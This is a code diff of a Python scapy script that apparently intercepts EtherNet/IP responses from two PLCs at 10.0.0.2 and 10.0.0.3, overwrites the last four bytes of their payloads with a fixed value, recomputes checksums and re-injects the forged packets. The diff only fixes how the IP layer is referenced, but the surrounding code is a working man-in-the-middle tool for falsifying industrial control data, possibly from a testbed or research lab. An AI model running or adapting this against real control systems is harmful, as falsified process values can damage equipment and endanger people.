@@ -21,7 +21,7 @@ def modify(packet):
     
     if (sys.argv[1] == 'PLC3'):
         print('Hey PLC3')
-        if pkt.haslayer(scapy.TCP) and pkt.getlayer(scapy.TCP).sport == 44818 and pkt[IP].src == '10.0.0.3':
+        if pkt.haslayer(scapy.TCP) and pkt.getlayer(scapy.TCP).sport == 44818 and pkt[scapy.IP].src == '10.0.0.3':
             if pkt.haslayer(Raw) and len(pkt.getlayer(Raw).load) == 50:
                 print("Seba")
                 mydata = binascii.hexlify(bytes(pkt[Raw].load)).decode()
@@ -35,7 +35,7 @@ def modify(packet):
         send(pkt)
     elif (sys.argv[1] == 'PLC2'):
         print('Hey PLC2')
-        if pkt.haslayer(scapy.TCP) and pkt.getlayer(scapy.TCP).sport == 44818 and pkt[IP].src == '10.0.0.2':
+        if pkt.haslayer(scapy.TCP) and pkt.getlayer(scapy.TCP).sport == 44818 and pkt[scapy.IP].src == '10.0.0.2':
             if pkt.haslayer(Raw) and len(pkt.getlayer(Raw).load) == 50:
                 print("Seba")
                 mydata = binascii.hexlify(bytes(pkt[Raw].load)).decode()
@@ -43,7 +43,7 @@ def modify(packet):
                 newdata = mydata[:-8]+'0000c03f'
                 print(newdata)
                 pkt[Raw].load = newdata.decode('hex')
-                del pkt[IP].chksum
+                del pkt[scapy.IP].chksum
                 del pkt[scapy.TCP].chksum
         packet.drop()
         send(pkt)
